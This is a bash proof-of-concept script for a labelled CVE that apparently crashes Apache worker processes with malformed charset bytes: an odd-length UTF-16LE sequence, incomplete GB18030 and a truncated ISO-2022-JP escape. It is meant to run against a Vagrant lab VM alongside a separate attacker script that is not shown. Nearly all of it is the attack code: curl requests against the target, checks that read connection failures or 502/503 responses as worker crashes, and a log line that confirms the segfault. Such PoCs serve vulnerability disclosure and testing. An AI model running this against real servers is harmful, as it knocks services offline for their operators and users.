#!/bin/bash
# ============================================================
# CVE-2026-63686 — Proof of Concept Trigger Script
# ============================================================
# Cross-platform (macOS / Linux / Git Bash on Windows).
#
# Run AFTER:
#   1. vagrant up                  (target VM running)
#   2. python3 attacker/poison.py --port 9090  (attacker running)
#
# Usage:
#   chmod +x poc.sh
#   ./poc.sh
#   ./poc.sh 192.168.56.10    # custom target IP (no port)
#   ./poc.sh localhost:8080   # custom target with port
# ============================================================

TARGET="${1:-localhost:8080}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

divider="============================================================"

echo "$divider"
echo "  CVE-2026-63686 — Proof of Concept"
echo "$divider"
echo ""
echo "  Target: http://${TARGET}"
echo ""

# ── Baseline ───────────────────────────────────────────────
echo "$divider"
echo -e "  ${CYAN}Test 0: Baseline (safe response)${NC}"
echo "$divider"
echo "[*] Sending:  curl http://${TARGET}/safe"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://${TARGET}/safe" 2>/dev/null)
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] Baseline OK — got HTTP ${HTTP_CODE}${NC}"
elif [ "$HTTP_CODE" = "000" ]; then
    echo -e "${YELLOW}[!] No response — is the VM and poison.py running?${NC}"
else
    echo -e "${YELLOW}[!] Got HTTP ${HTTP_CODE}${NC}"
fi
echo ""

# ── Payload 1: UTF-16LE ───────────────────────────────────
echo "$divider"
echo -e "  ${RED}Test 1: UTF-16LE orphan byte${NC}"
echo "$divider"
echo "[*] Sending:  curl http://${TARGET}/"
echo "    Charset:  UTF-16LE"
echo "    Payload:  \\x3c\\x00\\x3e\\x00\\x41 (5 bytes — odd count breaks UTF-16 pairs)"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://${TARGET}/" 2>/dev/null)
if [ "$HTTP_CODE" = "000" ]; then
    echo -e "${GREEN}[+] Connection failed — Apache worker likely crashed (SIGSEGV)${NC}"
elif [ "$HTTP_CODE" = "502" ] || [ "$HTTP_CODE" = "503" ]; then
    echo -e "${GREEN}[+] Got HTTP ${HTTP_CODE} — proxy error, worker likely crashed${NC}"
else
    echo -e "${YELLOW}[?] Got HTTP ${HTTP_CODE} — server may not have crashed${NC}"
fi
echo ""
sleep 2

# ── Payload 2: GB18030 ────────────────────────────────────
echo "$divider"
echo -e "  ${RED}Test 2: GB18030 incomplete multi-byte${NC}"
echo "$divider"
echo "[*] Sending:  curl http://${TARGET}/gb18030"
echo "    Charset:  GB18030"
echo "    Payload:  \\x81\\x40\\x41 (lead byte 0x81 expects valid trail byte)"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://${TARGET}/gb18030" 2>/dev/null)
if [ "$HTTP_CODE" = "000" ]; then
    echo -e "${GREEN}[+] Connection failed — Apache worker likely crashed (SIGSEGV)${NC}"
elif [ "$HTTP_CODE" = "502" ] || [ "$HTTP_CODE" = "503" ]; then
    echo -e "${GREEN}[+] Got HTTP ${HTTP_CODE} — proxy error, worker likely crashed${NC}"
else
    echo -e "${YELLOW}[?] Got HTTP ${HTTP_CODE} — server may not have crashed${NC}"
fi
echo ""
sleep 2

# ── Payload 3: ISO-2022-JP ────────────────────────────────
echo "$divider"
echo -e "  ${RED}Test 3: ISO-2022-JP dangling escape${NC}"
echo "$divider"
echo "[*] Sending:  curl http://${TARGET}/iso2022"
echo "    Charset:  ISO-2022-JP"
echo "    Payload:  \\x1b\\x24\\x42\\x41\\x41\\x42 (escape enters 2-byte mode, truncated)"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://${TARGET}/iso2022" 2>/dev/null)
if [ "$HTTP_CODE" = "000" ]; then
    echo -e "${GREEN}[+] Connection failed — Apache worker likely crashed (SIGSEGV)${NC}"
elif [ "$HTTP_CODE" = "502" ] || [ "$HTTP_CODE" = "503" ]; then
    echo -e "${GREEN}[+] Got HTTP ${HTTP_CODE} — proxy error, worker likely crashed${NC}"
else
    echo -e "${YELLOW}[?] Got HTTP ${HTTP_CODE} — server may not have crashed${NC}"
fi
echo ""

# ── Summary ────────────────────────────────────────────────
echo "$divider"
echo -e "  ${CYAN}PoC Complete${NC}"
echo "$divider"
echo ""
echo "  Check the Apache error log on the target VM:"
echo ""
echo "    vagrant ssh -c \"sudo tail -20 /var/log/apache2/error.log\""
echo ""
echo "  Look for lines containing:"
echo -e "    ${RED}\"AH00052: child pid ... exit signal Segmentation fault (11)\"${NC}"
echo ""
